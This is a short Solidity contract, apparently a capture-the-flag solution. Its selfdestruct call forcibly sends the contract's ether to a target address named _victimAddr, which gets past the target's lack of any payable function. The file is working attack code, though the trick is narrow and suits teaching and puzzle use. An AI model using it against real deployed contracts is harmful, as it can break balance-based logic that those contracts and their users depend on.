// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolver {
  function sendAndDestroy(address payable _victimAddr) public {
    selfdestruct(_victimAddr);
  }

  receive() external payable {}
}
